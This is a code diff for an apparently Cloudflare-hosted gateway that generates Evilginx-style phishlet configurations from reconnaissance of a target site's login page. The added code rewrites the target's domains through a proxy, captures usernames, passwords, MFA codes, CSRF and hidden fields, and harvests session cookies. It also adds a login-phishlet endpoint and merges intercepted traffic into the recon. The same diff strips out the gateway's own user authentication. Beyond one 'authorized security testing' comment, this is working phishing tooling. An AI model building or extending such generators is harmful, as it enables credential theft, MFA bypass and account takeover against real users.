@@ -141,6 +141,9 @@ const INTERCEPT_LIMIT = 500;
 /** Default TTL for intercept captures in seconds (10 min). */
 const INTERCEPT_DEFAULT_TTL = 600;
 
+/** Default TTL for traffic entries in seconds (24 hours). */
+const TRAFFIC_TTL_SECONDS = 86_400;
+
 type ItemRow = {
   id: number;
   name: string;
@@ -183,28 +186,40 @@ function pickMainDomain(domains: string[]): string | null {
   return candidates[0] ?? null;
 }
 
+export type ReconCaptured = {
+  urls?: string[];
+  cookies?: string[];
+  formFields?: { name: string; type: string; id?: string; placeholder?: string; required?: boolean; autocomplete?: string }[];
+  redirects?: string[];
+  domains?: string[];
+  /** Optional page title captured by the browser probe. */
+  pageTitle?: string;
+  /** Optional action-URL extracted from the login <form>. */
+  formAction?: string;
+  /** Optional form method extracted from the login <form>. */
+  formMethod?: string;
+  /** Hidden form fields observed during reconnaissance. */
+  hiddenInputs?: { name: string; value: string; id?: string }[];
+  /** Fields that look like CSRF/XSRF/nonce/state tokens. */
+  csrfFields?: { name: string; value: string; id?: string }[];
+  /** Links or buttons that appear to lead to authentication flows. */
+  authLinks?: { href: string; text: string }[];
+  /** API/auth endpoints captured from XHR/fetch and link analysis. */
+  apiEndpoints?: string[];
+  /** External script domains referenced by the target. */
+  scripts?: string[];
+  /** All <form> tags discovered on the landing page. */
+  forms?: { action: string; method: string; id?: string; name?: string }[];
+};
+
 /**
  * Build a production-grade Evilginx-style phishlet YAML from captured
- * reconnaissance data. Mirrors the sophistication of the PhishletForge
- * Python agent: smart domain analysis, auth-token cookie detection,
- * credential-to-key mapping, session/landing flags, login metadata,
- * and actionable notes for manual tuning.
+ * reconnaissance data. v3 adds real sub_filters, search-pattern credentials,
+ * dynamic CSRF tokens, OAuth/SAML detection, and API endpoint metadata.
  */
 function buildPhishletYaml(
   proxy: Proxy,
-  captured: {
-    urls?: string[];
-    cookies?: string[];
-    formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
-    redirects?: string[];
-    domains?: string[];
-    /** Optional page title captured by the browser probe. */
-    pageTitle?: string;
-    /** Optional action-URL extracted from the login <form>. */
-    formAction?: string;
-    /** Optional form method extracted from the login <form>. */
-    formMethod?: string;
-  },
+  captured: ReconCaptured,
 ): string {
   const target = new URL(proxy.targetUrl);
   const targetHost = target.hostname;
@@ -231,17 +246,19 @@ function buildPhishletYaml(
     ].join("\n");
   }).join("\n");
 
-  // ── landing_path ─────────────────────────────────────────────────────
+  // ── landing_path — prefer auth links, then redirects, then target URL ──
+  const authUrls = (captured.authLinks ?? []).map((l) => l.href);
   const landingCandidates = [
     ...(captured.redirects ?? []),
+    ...authUrls,
     ...(captured.urls ?? []),
     proxy.targetUrl,
-  ].filter(Boolean).slice(0, 6);
+  ].filter(Boolean).slice(0, 8);
   const landingPath = landingCandidates
     .map((u) => `    - '${u}'`)
     .join("\n");
 
-  // ── credentials — classify form fields into username / password / mfa ──
+  // ── credentials — classify form fields with search patterns ────────────
   const fields = captured.formFields ?? [];
 
   const isUsername = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
@@ -261,26 +278,51 @@ function buildPhishletYaml(
     return /otp|mfa|2fa|totp|code|token|verify|one.?time|auth.?code/i.test(key);
   };
 
+  const credentialLine = (f: { name: string; type: string; id?: string; placeholder?: string }, key: string): string => {
+    const name = f.name || f.id || "";
+    const search = name
+      ? `(?:name|id|ng-model)=["']${name.replace(/'/g, "\\'")}["']`
+      : f.type === "password"
+        ? `type=["']password["']`
+        : `type=["']${f.type}["']`;
+    return `    - key: '${key}'\n      search: '${search}'\n      type: '${f.type}'`;
+  };
+
   const usernameLines = fields
     .filter(isUsername)
-    .map((f) => `    - key: '${f.name || f.id || "username"}'`)
+    .map((f) => credentialLine(f, f.name || f.id || "username"))
     .join("\n");
   const passwordLines = fields
     .filter(isPassword)
-    .map((f) => `    - key: '${f.name || f.id || "password"}'`)
+    .map((f) => credentialLine(f, f.name || f.id || "password"))
     .join("\n");
   const mfaLines = fields
     .filter(isMfa)
-    .map((f) => `    - key: '${f.name || f.id || "otp"}'`)
+    .map((f) => credentialLine(f, f.name || f.id || "otp"))
     .join("\n");
+
+  const csrfLines = (captured.csrfFields ?? []).map((c) => {
+    const key = c.name || c.id || "csrf";
+    return `    - key: '${key}'\n      search: '(?:name|id)=["']${key.replace(/'/g, "\\'")}["']'\n      type: 'dynamic'`;
+  }).join("\n");
+
+  const hiddenLines = (captured.hiddenInputs ?? []).filter((h) => {
+    const key = (h.name || h.id || "").toLowerCase();
+    return !/csrf|xsrf|token|nonce|state|_requesttoken|__viewstate/.test(key);
+  }).map((h) => {
+    const key = h.name || h.id || "hidden";
+    return `    - key: '${key}'\n      search: '(?:name|id)=["']${key.replace(/'/g, "\\'")}["']'\n      type: 'dynamic'`;
+  }).join("\n");
 
   const credentialBlocks: string[] = [];
   if (usernameLines) credentialBlocks.push(usernameLines);
   if (passwordLines) credentialBlocks.push(passwordLines);
   if (mfaLines) credentialBlocks.push(mfaLines);
+  if (csrfLines) credentialBlocks.push(csrfLines);
+  if (hiddenLines) credentialBlocks.push(hiddenLines);
   const credentialsBlock = credentialBlocks.length > 0
     ? credentialBlocks.join("\n")
-    : `    - key: 'username'\n    - key: 'password'`;
+    : `    - key: 'username'\n      search: 'type=["']text["']'\n      type: 'text'\n    - key: 'password'\n      search: 'type=["']password["']'\n      type: 'password'`;
 
   // ── auth_tokens — detect session/auth cookies, not all cookies ───────
   const cookieNames = captured.cookies ?? [];
@@ -291,22 +333,35 @@ function buildPhishletYaml(
         .join("\n")
     : `    - domain: '${mainDomain}'\n      name: 'session'`;
 
-  // ── sub_filters — placeholder with guidance ──────────────────────────
-  const subFiltersNote = [
-    `    # --- MANUAL REVIEW REQUIRED ---`,
-    `    # Add domain rewrite rules here so absolute URLs in HTML/JS are`,
-    `    # rewritten to point through the proxy.  Common patterns:`,
-    `    #   'https://${mainDomain}'  ->  'https://{hostname}'`,
-    `    #   'https://www.${mainDomain}'  ->  'https://{hostname}'`,
-  ];
+  // ── sub_filters — generate real rewrite rules for observed domains ────
+  const subFilterDomains = domains.slice(0, 8);
+  const subFilters = subFilterDomains.length > 0
+    ? subFilterDomains.map((domain) => {
+      const bare = domain.replace(/^www\./, "");
+      const www = `www.${bare}`;
+      return [
+        `    - domains: ['${bare}']`,
+        `      search: ['https://${bare}', 'https://${www}', 'http://${bare}', 'http://${www}']`,
+        `      replace: ['https://{hostname}', 'https://{hostname}', 'https://{hostname}', 'https://{hostname}']`,
+        `      mimes: ['text/html', 'text/css', 'application/javascript', 'application/json', 'text/plain']`,
+      ].join("\n");
+    }).join("\n")
+    : `    # No domains observed — add sub_filters manually.`;
 
   // ── login section ────────────────────────────────────────────────────
-  const formAction = captured.formAction ?? fields.find((f) => f.name === "" || !f.name)?.["id"] ?? "";
-  const formMethod = captured.formMethod ?? "post";
+  const bestForm = (captured.forms ?? [])[0];
+  const formAction = captured.formAction ?? bestForm?.action ?? "";
+  const formMethod = captured.formMethod ?? bestForm?.method ?? "post";
   const loginPath = (() => {
-    try { return new URL(proxy.targetUrl).pathname || "/"; }
+    try { return new URL(formAction || proxy.targetUrl).pathname || "/"; }
     catch { return "/"; }
   })();
+
+  // ── auth-flow detection ──────────────────────────────────────────────
+  const allUrls = [...(captured.urls ?? []), ...authUrls, ...(captured.apiEndpoints ?? [])];
+  const hasOAuth = allUrls.some((u) => /oauth|openid|sso|signin/i.test(u));
+  const hasSaml = allUrls.some((u) => /saml/i.test(u));
+  const apiEndpoints = (captured.apiEndpoints ?? []).slice(0, 10);
 
   // ── assemble YAML ────────────────────────────────────────────────────
   const now = new Date().toISOString();
@@ -317,7 +372,7 @@ function buildPhishletYaml(
     `#  Target: ${proxy.targetUrl}`,
     `#  Agent: edge-gateway phishlet-forge (v2)`,
     `#`,
-    `#  Auto-generated base config — ~80 % complete.`,
+    `#  Auto-generated base config — sub_filters and credential searches included.`,
     `#  Review EVERY section before use.  Complex auth flows (OAuth, SAML,`,
     `#  WebAuthn, multi-step MFA) always require manual tuning.`,
     `# =============================================================================`,
@@ -330,8 +385,8 @@ function buildPhishletYaml(
     proxyHosts,
     ``,
     `sub_filters:`,
-    ...subFiltersNote,
-    ``,
+    subFilters,
+    ` `,
     `auth_tokens:`,
     authTokenBlock,
     ``,
@@ -348,23 +403,107 @@ function buildPhishletYaml(
     `landing_path:`,
     landingPath,
     ``,
+    `# ── Auth-flow detection ──`,
+    `oauth_detected: ${hasOAuth}`,
+    `saml_detected: ${hasSaml}`,
+    ``,
+    `# ── API endpoints observed (for intercept tuning) ──`,
+    `api_endpoints:`,
+    ...(apiEndpoints.length > 0 ? apiEndpoints.map((e) => `    - '${e}'`) : [`    # No API endpoints detected`]),
+    ``,
     `# ── Recon metadata (auto-generated) ──`,
     `generated_at: '${now}'`,
     `page_title: '${(captured.pageTitle ?? "").replace(/'/g, "''")}'`,
     `domains_observed: ${domains.length}`,
     `cookies_total: ${cookieNames.length}`,
     `auth_cookies_detected: ${authCookieNames.length}`,
-    `forms_found: ${fields.length > 0 ? 1 : 0}`,
+    `forms_found: ${(captured.forms ?? []).length}`,
     `redirects_observed: ${(captured.redirects ?? []).length}`,
+    `csrf_fields_detected: ${(captured.csrfFields ?? []).length}`,
+    `hidden_inputs_detected: ${(captured.hiddenInputs ?? []).length}`,
+    `auth_links_detected: ${(captured.authLinks ?? []).length}`,
+    `api_endpoints_detected: ${apiEndpoints.length}`,
     ``,
     `# ── Raw captured data (for reference) ──`,
     `raw_domains:`,
     ...domains.map((d) => `    - '${d}'`),
     `raw_auth_cookies:`,
     ...authCookieNames.map((c) => `    - '${c}'`),
+    `raw_auth_links:`,
+    ...(captured.authLinks ?? []).map((l) => `    - '${l.href}'  # ${l.text.replace(/'/g, "\\'")}`),
+    `raw_api_endpoints:`,
+    ...(captured.apiEndpoints ?? []).map((e) => `    - '${e}'`),
+    `raw_csrf_fields:`,
+    ...(captured.csrfFields ?? []).map((c) => `    - '${c.name || c.id || "csrf"}'`),
+    `raw_hidden_inputs:`,
+    ...(captured.hiddenInputs ?? []).map((h) => `    - '${h.name || h.id || "hidden"}'`),
   ].join("\n");
 
   return yaml;
+}
+
+/** Captured login-form data used by the simple login-phishlet generator. */
+export type LoginFormData = {
+  domain?: string;
+  loginPath?: string;
+  submitSelector?: string;
+  usernameField?: string;
+  passwordField?: string;
+  hiddenInputs?: { name: string; value: string }[];
+  /** Optional validation score from the headless agent (0.0-1.0). */
+  score?: number;
+};
+
+/**
+ * Build a minimal, deterministic login-phishlet YAML from a single captured login form.
+ * Output format is fixed to match the PhishletGen-Automator spec.
+ */
+function buildLoginPhishletYaml(
+  targetUrl: string,
+  loginForm: LoginFormData,
+): string {
+  const url = new URL(targetUrl);
+  const domain = loginForm.domain?.trim() || url.hostname;
+  const name = domain.replace(/\./g, "_");
+  const loginPath = loginForm.loginPath?.trim() || "/";
+  const submitSelector = loginForm.submitSelector?.trim() || 'form:has(> input[type="password"])';
+  const usernameField = loginForm.usernameField?.trim() || "username";
+  const passwordField = loginForm.passwordField?.trim() || "password";
+  const hiddenInputs = loginForm.hiddenInputs ?? [];
+
+  const inputLines = [
+    `    username: "${usernameField}"`,
+    `    password: "${passwordField}"`,
+  ];
+  for (const h of hiddenInputs) {
+    if (!h.name) continue;
+    const safeValue = (h.value || "").replace(/"/g, '\\"');
+    inputLines.push(`    ${h.name}: "${safeValue}"`);
+  }
+
+  return [
+    `# Login-form phishlet generated automatically from ${targetUrl}`,
+    `# Review before use — only for authorized security testing.`,
+    `name: "${name}"`,
+    `proxy:`,
+    `  - domain: "${domain}"`,
+    `    is_landing: true`,
+    `login:`,
+    `  path: "${loginPath}"`,
+    `  submit: "${submitSelector}"`,
+    `  inputs:`,
+    ...inputLines,
+    `credentials:`,
+    `  username:`,
+    `    key: "${usernameField}"`,
+    `  password:`,
+    `    key: "${passwordField}"`,
+    `session:`,
+    `  tokens:`,
+    `    - name: "session_cookie"`,
+    `      key: "Set-Cookie"`,
+    `      search: "session_id|token|auth"`,
+  ].join("\n");
 }
 
 /** Wrap a SQL operation so errors produce a structured 500 instead of crashing the DO. */
@@ -381,11 +520,11 @@ function safeSql<T>(fn: () => T): { ok: true; value: T } | { ok: false; error: s
  * ItemsStore is a single Durable Object instance (keyed "global") that owns
  * the Items table plus the gateway's boot timestamp used to compute uptime.
  */
-export class ItemsStore extends DurableObject {
+export class ItemsStore extends DurableObject<unknown, unknown> {
   private startedAt: number;
   private listCache: { body: string; expires: number } | null = null;
 
-  constructor(ctx: DurableObjectState, env: unknown) {
+  constructor(ctx: DurableObject<unknown, unknown>["ctx"], env: unknown) {
     super(ctx, env);
     this.ctx.storage.sql.exec(`
       CREATE TABLE IF NOT EXISTS items (
@@ -513,24 +652,6 @@ export class ItemsStore extends DurableObject {
         value TEXT NOT NULL DEFAULT ''
       )
     `);
-    this.ctx.storage.sql.exec(`
-      CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        email TEXT NOT NULL UNIQUE,
-        name TEXT NOT NULL DEFAULT '',
-        password_hash TEXT NOT NULL,
-        salt TEXT NOT NULL,
-        created_at INTEGER NOT NULL
-      )
-    `);
-    this.ctx.storage.sql.exec(`
-      CREATE TABLE IF NOT EXISTS sessions (
-        token TEXT PRIMARY KEY,
-        user_id INTEGER NOT NULL,
-        created_at INTEGER NOT NULL,
-        expires_at INTEGER NOT NULL
-      )
-    `);
     this.startedAt = Date.now();
   }
 
@@ -612,7 +733,7 @@ export class ItemsStore extends DurableObject {
       this.ctx.storage.sql
         .exec<InterceptRow>("SELECT * FROM intercept_captures ORDER BY id DESC LIMIT ?", INTERCEPT_LIMIT)
         .toArray()
-        .map((row) => ({
+        .map((row: InterceptRow) => ({
           id: row.id,
           ts: row.ts,
           slug: row.slug,
@@ -644,7 +765,7 @@ export class ItemsStore extends DurableObject {
           INTERCEPT_LIMIT,
         )
         .toArray()
-        .map((row) => ({
+        .map((row: InterceptRow) => ({
           id: row.id,
           ts: row.ts,
           slug: row.slug,
@@ -699,12 +820,21 @@ export class ItemsStore extends DurableObject {
     });
   }
 
+  /** Purge traffic entries older than the configured TTL. */
+  private purgeExpiredTraffic(ttlSeconds: number): void {
+    const cutoff = Date.now() - ttlSeconds * 1000;
+    safeSql(() => {
+      this.ctx.storage.sql.exec("DELETE FROM traffic WHERE ts < ?", cutoff);
+    });
+  }
+
   private listTraffic(): TrafficEntry[] {
+    this.purgeExpiredTraffic(TRAFFIC_TTL_SECONDS);
     const result = safeSql(() =>
       this.ctx.storage.sql
         .exec<TrafficRow>("SELECT * FROM traffic ORDER BY id DESC LIMIT ?", TRAFFIC_LIMIT)
         .toArray()
-        .map((row) => ({
+        .map((row: TrafficRow) => ({
           id: row.id,
           ts: row.ts,
           method: row.method,
@@ -999,24 +1129,9 @@ export class ItemsStore extends DurableObject {
       return response;
     };
 
-    if (path === "/api/auth/signup" && method === "POST") {
-      return withRl(await this.handleSignup(request));
-    }
-    if (path === "/api/auth/login" && method === "POST") {
-      return withRl(await this.handleLogin(request));
-    }
-    if (path === "/api/auth/logout" && method === "POST") {
-      return withRl(this.handleLogout(request));
-    }
-    if (path === "/api/auth/me" && method === "GET") {
-      const user = this.resolveSessionUser(request);
-      if (!user) {
-        return withRl(Response.json({ success: false, error: "unauthorized" }, { status: 401 }));
-      }
-      return withRl(Response.json({ success: true, data: { user } }));
-    }
-
     if (path === "/health") {
+      this.purgeExpiredTraffic(TRAFFIC_TTL_SECONDS);
+      this.purgeExpiredIntercepts(INTERCEPT_DEFAULT_TTL);
       const startedAt = await this.ensureStartedAt();
       const counts = safeSql(() => ({
         items: this.ctx.storage.sql
@@ -1235,13 +1350,7 @@ export class ItemsStore extends DurableObject {
       if (method === "POST") {
         const body = (await this.safeJson(request)) as {
           targetUrl?: string;
-          captured?: {
-            urls?: string[];
-            cookies?: string[];
-            formFields?: { name: string; type: string }[];
-            redirects?: string[];
-            domains?: string[];
-          };
+          captured?: ReconCaptured;
         } | null;
         const captured = body?.captured ?? {};
         // Merge with recent intercepts for richer reconnaissance.
@@ -1265,12 +1374,21 @@ export class ItemsStore extends DurableObject {
           })
           .filter(Boolean);
         const interceptedUrls = intercepts.map((i) => `${i.host}${i.path}`);
-        const merged: typeof captured = {
+        const merged: ReconCaptured = {
           urls: [...new Set([...(captured.urls ?? []), ...interceptedUrls])],
           cookies: [...new Set([...(captured.cookies ?? []), ...interceptedCookies])],
           formFields: captured.formFields ?? [],
           redirects: captured.redirects ?? [],
           domains: [...new Set([...(captured.domains ?? []), ...interceptedDomains])],
+          pageTitle: captured.pageTitle,
+          formAction: captured.formAction,
+          formMethod: captured.formMethod,
+          hiddenInputs: captured.hiddenInputs ?? [],
+          csrfFields: captured.csrfFields ?? [],
+          authLinks: captured.authLinks ?? [],
+          apiEndpoints: captured.apiEndpoints ?? [],
+          scripts: captured.scripts ?? [],
+          forms: captured.forms ?? [],
         };
         const phishlet = buildPhishletYaml(existing, merged);
         safeSql(() => {
@@ -1285,6 +1403,56 @@ export class ItemsStore extends DurableObject {
           Response.json({
             success: true,
             data: { proxyId: id, phishlet, captured: merged },
+          }),
+        );
+      }
+    }
+
+    const loginPhishletMatch = path.match(/^\/api\/proxies\/(\d+)\/login-phishlet$/);
+    if (loginPhishletMatch) {
+      const id = Number(loginPhishletMatch[1]);
+      const existing = this.findProxy(id);
+      if (!existing) {
+        return Response.json(
+          { success: false, error: "proxy not found" },
+          { status: 404 },
+        );
+      }
+      if (method === "POST") {
+        const body = (await this.safeJson(request)) as {
+          targetUrl?: string;
+          loginForm?: LoginFormData;
+        } | null;
+        const targetUrl = body?.targetUrl?.trim() || existing.targetUrl;
+        try {
+          new URL(targetUrl);
+        } catch {
+          return Response.json(
+            { success: false, error: "targetUrl must be a valid http(s) URL" },
+            { status: 400 },
+          );
+        }
+        const loginForm = body?.loginForm ?? {};
+        const score = typeof loginForm.score === "number" ? loginForm.score : 1;
+        if (score < 0.7) {
+          return Response.json(
+            { success: false, error: `validation score ${score} is below threshold (0.7)` },
+            { status: 422 },
+          );
+        }
+        const phishlet = buildLoginPhishletYaml(targetUrl, loginForm);
+        safeSql(() => {
+          this.ctx.storage.sql.exec(
+            "UPDATE proxies SET phishlet = ?, updated_at = ? WHERE id = ?",
+            phishlet,
+            Date.now(),
+            id,
+          );
+        });
+        return withRl(
+          Response.json({
+            success: true,
+            data: { proxyId: id, phishlet, loginForm, score },
           }),
         );
       }
@@ -1477,7 +1645,7 @@ export class ItemsStore extends DurableObject {
       this.ctx.storage.sql
         .exec<ItemRow>("SELECT * FROM items ORDER BY created_at DESC")
         .toArray()
-        .map((row) => this.toItem(row)),
+        .map((row: ItemRow) => this.toItem(row)),
     );
     return result.ok ? result.value : [];
   }
@@ -1500,160 +1668,6 @@ export class ItemsStore extends DurableObject {
       createdAt: row.created_at,
       updatedAt: row.updated_at,
     };
-  }
-
-  // ── Authentication (email + password) ──
-
-  /** Derive a PBKDF2 hash for a password using the given hex salt. Returns a hex digest. */
-  private async hashPassword(password: string, saltHex: string): Promise<string> {
-    const enc = new TextEncoder();
-    const salt = Uint8Array.from(saltHex.match(/.{2}/g)?.map((b) => parseInt(b, 16)) ?? []);
-    const key = await crypto.subtle.importKey("raw", enc.encode(password), "PBKDF2", false, [
-      "deriveBits",
-    ]);
-    const bits = await crypto.subtle.deriveBits(
-      { name: "PBKDF2", salt, iterations: 100_000, hash: "SHA-256" },
-      key,
-      256,
-    );
-    return [...new Uint8Array(bits)].map((b) => b.toString(16).padStart(2, "0")).join("");
-  }
-
-  /** Generate a random hex string of the given byte length. */
-  private randomHex(bytes: number): string {
-    const arr = new Uint8Array(bytes);
-    crypto.getRandomValues(arr);
-    return [...arr].map((b) => b.toString(16).padStart(2, "0")).join("");
-  }
-
-  /** Constant-time string comparison to avoid timing attacks on the password hash. */
-  private safeEqual(a: string, b: string): boolean {
-    if (a.length !== b.length) return false;
-    let diff = 0;
-    for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
-    return diff === 0;
-  }
-
-  private async handleSignup(request: Request): Promise<Response> {
-    const body = (await this.safeJson(request)) as {
-      email?: string;
-      password?: string;
-      name?: string;
-    } | null;
-    const email = (body?.email ?? "").toString().trim().toLowerCase();
-    const password = (body?.password ?? "").toString();
-    const name = (body?.name ?? "").toString().trim();
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      return Response.json({ success: false, error: "Enter a valid email address." }, { status: 400 });
-    }
-    if (password.length < 8) {
-      return Response.json(
-        { success: false, error: "Password must be at least 8 characters." },
-        { status: 400 },
-      );
-    }
-    const existing = safeSql(() =>
-      this.ctx.storage.sql.exec<{ n: number }>("SELECT COUNT(*) AS n FROM users WHERE email = ?", email).one().n,
-    );
-    if (existing.ok && existing.value > 0) {
-      return Response.json({ success: false, error: "An account with that email already exists." }, { status: 409 });
-    }
-    const salt = this.randomHex(16);
-    const hash = await this.hashPassword(password, salt);
-    const now = Date.now();
-    const inserted = safeSql(() => {
-      this.ctx.storage.sql.exec(
-        "INSERT INTO users (email, name, password_hash, salt, created_at) VALUES (?, ?, ?, ?, ?)",
-        email,
-        name,
-        hash,
-        salt,
-        now,
-      );
-      return this.ctx.storage.sql
-        .exec<{ id: number }>("SELECT id FROM users WHERE id = last_insert_rowid()")
-        .one().id;
-    });
-    if (!inserted.ok) {
-      return Response.json({ success: false, error: "Could not create the account." }, { status: 500 });
-    }
-    return this.issueSession(inserted.value, email, name);
-  }
-
-  private async handleLogin(request: Request): Promise<Response> {
-    const body = (await this.safeJson(request)) as { email?: string; password?: string } | null;
-    const email = (body?.email ?? "").toString().trim().toLowerCase();
-    const password = (body?.password ?? "").toString();
-    const row = safeSql(() =>
-      this.ctx.storage.sql
-        .exec<{ id: number; name: string; password_hash: string; salt: string }>(
-          "SELECT id, name, password_hash, salt FROM users WHERE email = ?",
-          email,
-        )
-        .toArray()[0],
-    );
-    if (!row.ok || !row.value) {
-      return Response.json({ success: false, error: "Invalid email or password." }, { status: 401 });
-    }
-    const hash = await this.hashPassword(password, row.value.salt);
-    if (!this.safeEqual(hash, row.value.password_hash)) {
-      return Response.json({ success: false, error: "Invalid email or password." }, { status: 401 });
-    }
-    return this.issueSession(row.value.id, email, row.value.name);
-  }
-
-  /** Create a session token for a user and return the auth payload. */
-  private issueSession(userId: number, email: string, name: string): Response {
-    const token = this.randomHex(32);
-    const now = Date.now();
-    const expiresAt = now + 30 * 24 * 60 * 60 * 1000; // 30 days
-    const created = safeSql(() => {
-      this.ctx.storage.sql.exec("DELETE FROM sessions WHERE expires_at < ?", now);
-      this.ctx.storage.sql.exec(
-        "INSERT INTO sessions (token, user_id, created_at, expires_at) VALUES (?, ?, ?, ?)",
-        token,
-        userId,
-        now,
-        expiresAt,
-      );
-    });
-    if (!created.ok) {
-      return Response.json({ success: false, error: "Could not start a session." }, { status: 500 });
-    }
-    return Response.json({
-      success: true,
-      data: { token, user: { id: userId, email, name } },
-    });
-  }
-
-  /** Resolve the authenticated user from a Bearer session token, or null. */
-  private resolveSessionUser(
-    request: Request,
-  ): { id: number; email: string; name: string } | null {
-    const auth = request.headers.get("Authorization") ?? "";
-    const token = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
-    if (!token) return null;
-    const row = safeSql(() =>
-      this.ctx.storage.sql
-        .exec<{ user_id: number; expires_at: number; email: string; name: string }>(
-          "SELECT s.user_id, s.expires_at, u.email, u.name FROM sessions s JOIN users u ON u.id = s.user_id WHERE s.token = ?",
-          token,
-        )
-        .toArray()[0],
-    );
-    if (!row.ok || !row.value) return null;
-    if (row.value.expires_at < Date.now()) {
-      safeSql(() => this.ctx.storage.sql.exec("DELETE FROM sessions WHERE token = ?", token));
-      return null;
-    }
-    return { id: row.value.user_id, email: row.value.email, name: row.value.name };
-  }
-
-  private handleLogout(request: Request): Response {
-    const auth = request.headers.get("Authorization") ?? "";
-    const token = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
-    if (token) safeSql(() => this.ctx.storage.sql.exec("DELETE FROM sessions WHERE token = ?", token));
-    return Response.json({ success: true, data: null });
   }
 
   private async safeJson(request: Request): Promise<unknown> {
